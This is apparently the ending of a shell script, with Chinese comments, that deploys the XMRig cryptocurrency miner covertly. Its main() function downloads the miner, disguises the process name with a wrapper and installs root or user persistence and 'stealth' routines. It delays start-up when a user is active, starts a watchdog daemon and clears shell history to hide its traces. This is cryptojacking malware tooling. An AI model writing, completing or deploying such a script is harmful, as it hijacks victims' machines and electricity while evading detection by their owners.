
#===========================================
# 错误回滚（仅 main() 中显式调用，不用 trap 避免误触发）
#===========================================

_rollback() {
    log "执行回滚..."
    
    # 停止已启动的进程
    [ -n "$PROCESS_NAME" ] && pkill -f "$PROCESS_NAME" 2>/dev/null
    pkill -f "\.launcher-" 2>/dev/null
    pkill -f "\.monitor-" 2>/dev/null
    
    # 清理安装目录
    [ -n "$INSTALL_DIR" ] && [ -d "$INSTALL_DIR" ] && rm -rf "$INSTALL_DIR" 2>/dev/null
    
    error "部署失败，已回滚"
}

die() {
    error "$1"
    _rollback
    exit 1
}

#===========================================
# 主函数
#===========================================

main() {
    parse_arguments "$@"
    
    log "=== XMRig 部署脚本 v$VERSION ==="
    log "钱包: ${WALLET_ADDRESS:0:20}..."
    log "矿池: $POOL_ADDRESS"
    log "CPU: $CPU_PERCENTAGE%"
    
    # 检测环境
    detect_privilege
    detect_environment
    
    # 计算核心数
    ACTUAL_CORES=$(calculate_cores "$CPU_CORES" "$CPU_PERCENTAGE")
    log "使用核心数: $ACTUAL_CORES"
    
    # 选择安装目录和进程名
    INSTALL_DIR=$(select_install_dir)
    PROCESS_NAME=$(select_process_name)
    # 清理进程名中的特殊字符用于文件名
    local safe_name
    safe_name=$(echo "$PROCESS_NAME" | tr -cd 'a-zA-Z0-9_-')
    [ -z "$safe_name" ] && safe_name="helper"
    PROCESS_NAME="$safe_name"
    
    log "安装目录: $INSTALL_DIR"
    log "进程名: $PROCESS_NAME"
    
    # 下载二进制文件
    if ! download_binary; then
        die "下载失败"
    fi
    
    # 校验二进制有效
    if ! [ -s "$INSTALL_DIR/$PROCESS_NAME" ]; then
        die "二进制文件无效或为空"
    fi
    
    # 创建进程名伪装 wrapper（systemd 等服务也会用到）
    create_launcher
    
    # 根据权限应用不同策略
    if [ "$PRIV_MODE" = "root" ]; then
        setup_root_persistence
        setup_root_stealth
    else
        setup_user_persistence
        setup_user_stealth
    fi
    
    # 启动进程
    if check_user_activity; then
        start_process
    else
        log "检测到用户活跃，延迟启动"
    fi
    
    # 启动监控守护进程
    start_monitor_daemon
    
    # 清理历史
    clean_history
    
    log "=== 部署完成 ==="
    log "模式: $PRIV_MODE"
    log "路径: $INSTALL_DIR/$PROCESS_NAME"
    log "服务: $SERVICE_NAME"
}

# 执行
main "$@"
